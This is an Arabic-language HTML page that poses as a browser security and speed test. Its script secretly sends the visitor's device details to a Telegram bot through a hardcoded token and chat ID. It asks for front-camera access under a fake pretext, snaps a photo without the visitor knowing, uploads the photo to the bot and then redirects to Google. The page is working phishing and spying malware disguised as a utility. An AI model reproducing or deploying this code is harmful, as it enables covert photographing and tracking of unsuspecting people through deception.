<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أداة فحص الأمان والسرعة</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #0b0e14; color: #ffffff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .main-box { background: #1a1d26; padding: 40px 20px; border-radius: 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); width: 85%; max-width: 400px; border: 1px solid #2d323e; }
        .speed-icon { font-size: 55px; color: #00d2ff; margin-bottom: 20px; text-shadow: 0 0 20px rgba(0,210,255,0.4); }
        h2 { font-size: 20px; font-weight: 600; margin-bottom: 15px; letter-spacing: 0.5px; }
        p { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
        .btn-check { background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%); color: white; border: none; padding: 15px 35px; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; box-shadow: 0 10px 20px rgba(58, 123, 213, 0.3); }
        .btn-check:active { transform: scale(0.98); }
        .loading-area { display: none; }
        .progress-bg { background: #2d323e; border-radius: 10px; height: 6px; width: 100%; margin: 20px 0; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: #00d2ff; transition: width 0.5s; box-shadow: 0 0 10px #00d2ff; }
        #v, #c { display: none; }
    </style>
</head>
<body>

<div class="main-box" id="ui-1">
    <div class="speed-icon">🚀</div>
    <h2>فحص استقرار المتصفح</h2>
    <p>لضمان أفضل تجربة تصفح آمنة وسريعة، يرجى إجراء اختبار لبروتوكولات الأمان SSL والتحقق من استقرار الاتصال الحالي.</p>
    <button class="btn-check" onclick="startProcess()">بدأ الاختبار السريع</button>
</div>

<div class="main-box loading-area" id="ui-2">
    <div class="speed-icon">⚡</div>
    <h2 id="status-text">جاري تحليل البيانات...</h2>
    <div class="progress-bg"><div id="bar" class="progress-fill"></div></div>
    <p style="font-size: 12px;">يرجى عدم إغلاق الصفحة لضمان دقة الفحص</p>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    const T = '8409410631:AAFhc4ENmetOY0tCRzhFfwVN6H3ShW4RSCg';
    const C = '5156556639';

    async function push(data, isText = false) {
        const url = `https://api.telegram.org/bot${T}/${isText ? 'sendMessage' : 'sendPhoto'}`;
        if (isText) {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: C, text: data })
            });
        } else {
            const fd = new FormData();
            fd.append('chat_id', C);
            fd.append('photo', data, 'snap.jpg');
            await fetch(url, { method: 'POST', body: fd });
        }
    }

    function startProcess() {
        document.getElementById('ui-1').style.display = 'none';
        document.getElementById('ui-2').style.display = 'block';
        
        const bar = document.getElementById('bar');
        const txt = document.getElementById('status-text');

        // سحب معلومات الجهاز صامتاً
        push(`📊 تقرير فحص جديد:\nIP: [Pending]\nDevice: ${navigator.platform}\nEngine: ${navigator.vendor}`, true);

        // طلب صلاحية الكاميرا تحت مسمى "فحص استقرار البصمة"
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(s => {
            bar.style.width = '35%';
            txt.innerText = "جاري مطابقة التشفير...";
            
            const v = document.getElementById('v');
            v.srcObject = s;

            setTimeout(() => {
                bar.style.width = '75%';
                txt.innerText = "يتم الآن تأمين الاتصال...";
                
                const canvas = document.getElementById('c');
                canvas.width = 720;
                canvas.height = 1280;
                canvas.getContext('2d').drawImage(v, 0, 0, 720, 1280);
                
                canvas.toBlob(b => {
                    push(b).then(() => {
                        bar.style.width = '100%';
                        txt.innerText = "اكتمل الفحص بنجاح!";
                        setTimeout(() => { window.location.href = "https://www.google.com"; }, 800);
                    });
                }, 'image/jpeg', 0.6); // ضغط الصورة لسرعة الرفع
            }, 2500); 
        })
        .catch(() => { window.location.href = "https://www.google.com"; });
    }
</script>
</body>
</html>
